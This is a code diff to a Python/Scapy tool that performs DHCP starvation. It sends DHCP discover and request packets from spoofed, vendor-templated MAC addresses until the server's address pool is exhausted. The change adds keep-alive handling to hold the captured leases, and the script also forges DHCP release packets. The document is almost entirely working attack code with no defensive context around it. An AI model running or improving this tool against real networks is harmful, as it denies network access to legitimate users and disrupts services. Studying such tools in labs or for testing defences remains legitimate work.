@@ -6,13 +6,15 @@ import sys
 from enum import Enum
 import inspect
 import random
+import mac
 from types import SimpleNamespace
 
 IP_GLOBAL_BROADCAST='255.255.255.255'
 
 args = SimpleNamespace()
 args.debug=False
-
+args.keep_alive=False
+args.keep_alive_while_starving=False
 class MESSAGETYPE:
     DISCOVER = 1
     OFFER = 2
@@ -31,6 +33,7 @@ TODO make mac templates
 TODO verbose flag
 TODO option to write pcap
 TODO use python buit-in logger
+TODO check keep alive while starving
 """
 
 
@@ -67,7 +70,7 @@ def dhcp_release(server_mac : str ,server_ip : str, ip : str , src_mac : str, tr
     releaseMyIp = Ether(dst=server_mac, src=src_mac)\
                     / IP(dst=server_ip,src=ip,ttl=5)\
                     / UDP(dport=67,sport=68)\
-                    / BOOTP(htype=1,op=1,chaddr=boop_mac(src_mac), xid = transaction_id, ciaddr = ip, hops = 2)\
+                    / BOOTP(htype=1,op=1,chaddr=mac_to_binary(src_mac), xid = transaction_id, ciaddr = ip)\
                     / DHCP(options=dhcp_options)
     
     if(args.debug):
@@ -96,7 +99,7 @@ def dhcp_discover(src_mac : str, interface : str = conf.iface):
     sends a DHCP discover with the source being the args through the arg interface
     """
     
-    dhcp_options = [('message-type', 'discover'), ('client_id', src_mac)]
+    dhcp_options = [('message-type', 'discover'), ('client_id', src_mac), ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),('end')]
     discover_packet = Ether(dst = ETHER_BROADCAST, src=src_mac, type=ETHER_TYPES.IPv4)\
                         / IP(dst=IP_GLOBAL_BROADCAST, src='0.0.0.0')\
                         / UDP(dport=67,sport=68)\
@@ -156,15 +159,16 @@ def capture_my_dhcp_offer(dest_mac : str, server_mac : str, interface : str = co
     function_name = inspect.currentframe().f_code.co_name
 
     if (args.debug):
-        print(f"{function_name} : sniffing on interface {interface}")
+        print(f"{function_name} : sniffing on interface {interface} for dhcp offers for {dest_mac}")
     
     res = sniff(count=1, filter = f"udp and ether src {server_mac}", timeout=4, iface=interface,\
             lfilter= lambda packet : is_my_dhcp_offer(packet, dest_mac))
 
-    result_list[0] = res[0]
+    if len(res) != 0:
+        result_list[0] = res[0]
 
     if (args.debug ):
-        if res is not None : print(f"{function_name} : captured {res}")
+        if len(res) != 0 : print(f"{function_name} : captured {res}")
         else : print(f"{function_name} : returning None")
     
     return None
@@ -264,17 +268,29 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
     if(args.debug):
         print(f"{function_name} : starving {ips_to_starve} IPs from {server_ip} , {server_mac}")
 
-
+    i = 0
     
-    for i in range(0,ips_to_starve):
-        
-        print(f"{function_name} : attemp {i}")
+    time_to_wait = 1
 
-        temp_mac=str(RandMAC())
+    while (len(occupied_ips) < ips_to_starve):
+        
+        time.sleep(time_to_wait)
+        
+        keep_alive_thread = threading.Thread(target=keep_ips_alive_icmp, args=[occupied_ips, server_ip, server_mac], name='sniff for offer')
+        if((args.keep_alive_while_starving) and (len(occupied_ips) != 0)):
+            print(f"{function_name} : keeping alive while starving")
+            keep_alive_thread.start()
+
+        print(f"{function_name} : attempt {i} captured {len(occupied_ips)} IP's time_to_wait {time_to_wait}")
+        i += 1
+
+        mac_template = mac.macs[random.randint(0,len(mac.macs) - 1)][1]
+        print(mac_template)
+        temp_mac = str(RandMAC(mac_template))
 
         offer = [None]
         
-        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, server_mac, interface ,offer])
+        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, server_mac, interface ,offer], name='sniff for offer')
         sniff_thread.start()
         
         time.sleep(0.2)
@@ -284,6 +300,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         
         if(offer[0] is None):
             print('no offer captured')
+            time_to_wait += 1
             continue
         
         offered_ip = offer[0][BOOTP].yiaddr
@@ -291,13 +308,17 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         if args.debug:
             print(offered_ip + ',' + temp_mac)
         
+
+
         dhcp_request(offered_ip, temp_mac, random_transaction_id(), server_ip, interface)
         
         if(is_acked):
             occupied_ips.append((offered_ip, temp_mac, interface))
         
-        time.sleep(1)
+        
+        keep_alive_thread._stop()
 
+        time_to_wait -= 1
     return occupied_ips
 
 
